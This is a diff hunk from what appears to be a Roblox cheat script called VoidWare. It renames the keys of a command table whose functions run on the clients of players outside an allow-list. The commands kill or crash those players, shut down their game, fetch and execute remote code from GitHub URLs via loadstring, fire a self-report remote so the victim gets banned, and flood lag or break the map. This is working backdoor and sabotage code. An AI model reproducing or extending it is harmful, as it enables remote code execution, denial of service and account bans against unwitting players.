@@ -10449,12 +10449,12 @@ function CanAttackUser(u)
 end
 
 local commands = {
-	[".kill default"] = function()
+	[".kill"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
 		end
 	end,
-	[".funnyvideo default"] = function()
+	[".funnyvideo"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local filename = "bruh"
 			local ScreenGui = Instance.new("ScreenGui")
@@ -10480,14 +10480,14 @@ local commands = {
 			video:Play()
 		end
 	end,
-	[".reveal default"] = function()
+	[".reveal"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local textChatService = game:GetService("TextChatService")
 			wait(0.0001)
 			textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("Im Using VoidWare Made By VoidRelease")
 		end
 	end,
-	[".void default"] = function()
+	[".void"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local character = game.Players.LocalPlayer.Character
 			local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
@@ -10499,14 +10499,14 @@ local commands = {
 			end
 		end
 	end,
-	[".blind default"] = function()
+	[".blind"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local blur = Instance.new("BlurEffect")
 			blur.Size = 10000000000000
 			blur.Parent = game.Lighting
 		end
 	end,
-	[".unblind default"] = function()
+	[".unblind"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local blur = game.Lighting:FindFirstChildOfClass("BlurEffect")
 			if blur then
@@ -10514,12 +10514,12 @@ local commands = {
 			end
 		end
 	end,
-	[".troll default"] = function()
+	[".troll"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/trollage"))()
 		end
 	end,
-	[".kick default"] = function()
+	[".kick"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			wait(1)
 			for index, player in pairs(game.Players:GetPlayers()) do
@@ -10527,39 +10527,39 @@ local commands = {
 			end
 		end
 	end,
-	[".ban default"] = function()
+	[".ban"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local rs = game:GetService("ReplicatedStorage")
 			local remote = rs:FindFirstChild("SelfReport", true)
 			remote:FireServer("injection_detected")
 		end
 	end,
-	[".rickroll default"] = function()
+	[".rickroll"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			loadstring(game:HttpGet("https://raw.githubusercontent.com/SnoopyOwner/Modules/main/RickRoll"))()
 		end
 	end,
-	[".freeze default"] = function()
+	[".freeze"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = true
 		end
 	end,
-	[".thaw default"] = function()
+	[".thaw"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game.Players.LocalPlayer.Character.HumanoidRootPart.Massless = false
 		end
 	end,
-	[".lobby default"] = function()
+	[".lobby"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game:GetService("ReplicatedStorage"):FindFirstChild("bedwars"):FindFirstChild("ClientHandler"):Get("TeleportToLobby"):SendToServer()
 		end
 	end,
-	[".quitgame default"] = function()
+	[".quitgame"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			game:Shutdown()
 		end
 	end,
-	[".lagback default"] = function()
+	[".lagback"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			for i = 1, 10 do
 				wait()
@@ -10572,7 +10572,7 @@ local commands = {
 			end
 		end
 	end,
-	[".breakgame default"] = function()
+	[".breakgame"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			pcall(function()
 				local replicatedStorage = game:GetService("ReplicatedStorage")
@@ -10582,7 +10582,7 @@ local commands = {
 			end)
 		end
 	end,
-	[".breakmap default"] = function()
+	[".breakmap"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local function unanchorParts(object)
 				if object:IsA("BasePart") then
@@ -10595,18 +10595,18 @@ local commands = {
 			unanchorParts(workspace)
 		end
 	end,
-	[".crash default"] = function()
+	[".crash"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			while true do end
 		end
 	end,
-	[".infping default"] = function()
+	[".infping"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			local thingy = settings().Network
 			thingy.IncomingReplicationLag = math.huge
 		end
 	end,
-	[".lag default"] = function()
+	[".lag"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then 
 			local RunService = game:GetService("RunService")
 			local player = game.Players.LocalPlayer
@@ -10624,7 +10624,7 @@ local commands = {
 			end)
 		end
 	end,
-	[".loopkill default"] = function()
+	[".loopkill"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			_G.loopkill = true;
 			while _G.loopkill == true do
@@ -10633,7 +10633,7 @@ local commands = {
 			end
 		end
 	end,
-	[".unloopkill default"] = function()
+	[".unloopkill"] = function()
 		if not isPlayerAllowed(game.Players.LocalPlayer.Name) then
 			_G.loopkill = false;
 		end
